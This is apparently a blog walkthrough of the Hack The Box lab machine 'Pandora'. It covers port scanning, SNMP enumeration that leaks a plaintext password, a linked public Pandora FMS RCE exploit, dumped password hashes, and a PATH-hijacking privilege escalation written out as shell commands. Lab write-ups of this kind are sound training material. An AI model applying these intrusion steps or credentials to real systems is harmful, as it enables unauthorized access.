---
layout: post
title: HTB - pandora
date: 2025-04-09 09:00 -0400
---

{{ 'pandora' | get_machine_avatar | raw }}

## nmap
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-25 15:39 -04
Nmap scan report for 10.10.11.136
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
|_  256 e736433ba9478a190158b2bc89f65108 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
```

## main page
![panda.htb](/assets/img/pandora1.png)

Some emails and domains on the page body:
- support@panda.htb
- contact@panda.htb
- Panda.HTB

subdomain bruteforce gives nothing.
```bash
~/workspace/projects/htb/pandora » ffuf -u http://$(cat ip.txt)/ -H 'Host: FUZZ.panda.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.136/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.panda.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [4990/4990] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:51] :: Errors: 0 ::
```

Contact seems to be the only feature that works.
Looks a lot like xss but it isn't working.
Directory listings are enabled but there is nothing interesting in it.
Nothing in the js files also.

Time to check udp.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-25 16:13 -04
Warning: 10.10.11.136 giving up on port because retransmission cap hit (10).
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.16s latency).
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 73.80 seconds
```

Cool, nmap found something.

```bash
~/workspace/projects/htb/pandora » sudo nmap -p161 --script='*snmp*' -sU $(cat ip.txt) --min-rate 10000
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-25 16:15 -04
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.26s latency).

Bug in snmp-win32-software: no string output.
PORT    STATE SERVICE
161/udp open  snmp
...
| snmp-brute:
|_  public - Valid credentials
...

Nmap done: 1 IP address (1 host up) scanned in 65.01 seconds
```

Now we dump everything with: `snmpbulkwalk -c public -v2c panda.htb` and maybe there are some creds somewhere here.

These look a lot like creds.
```bash
HOST-RESOURCES-MIB::hrSWRunParameters.1086 = STRING: "-u daniel -p HotelBabylon23"
```

And that gives us the daniel shell but no user flag.
```bash
daniel@pandora:~$ cat /etc/passwd | grep /bash
root:x:0:0:root:/root:/bin/bash
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```

So matt is probably our next target.

Interesting files on `/var/www/pandora/pandora_console/`.
![pandora console](/assets/img/pandora4.png)

Seems to be using [pandorafms](https://github.com/pandorafms/pandorafms.git) from the Dockerfile.

Looks like there is an RCE with a public poc. [POC](https://www.exploit-db.com/exploits/50961). Doesn't seem to work.

This second one does. [POC1](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)

This is both a RCE and a SQLi, that gives us the user flag.

```bash
matt@pandora:/tmp/tmp.44zbQs0ont# cat ~/user.txt
a162c***************************
```

Will try to bruteforce the hashes just in case matt's password is needed.
```bash
[*] None,admin@pandora.htb,ad3f741b04bd5880fb32b54bc4f43d6a
[*] None,daniel@pandora.htb,76323c174bd49ffbbdedf678f6cc89a6
[*] None,matt@pandora.htb,f655f807365b6dc602b31ab3d6d43acc
```

Nothing on crackstation.
![crackstation](/assets/img/pandora7.png)

Nothing on hashcat either.

There is an interesting suid binary.
```bash
262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup
```

At first I thought I needed matt's password to run with sudo, but that is not the case.

Looking at ghidra we can see a `setreuid` call. That makes so matt keeps the root privilege when running without sudo.
![ghidra bin](/assets/img/pandora9.png)

And the actual bug is on `system()`. It doesn't specify a path so we can just change PATH to any script called tar.
```bash
cd $(mktemp -d)
export PATH=$(realpath .):/bin/:/usr/bin
echo 'cat /root/root.txt > /tmp/flag' > tar
chmod +x tar
/usr/bin/pandora_backup
root@pandora:/tmp/tmp.44zbQs0ont# cat ../flag
# e458b***************************
```
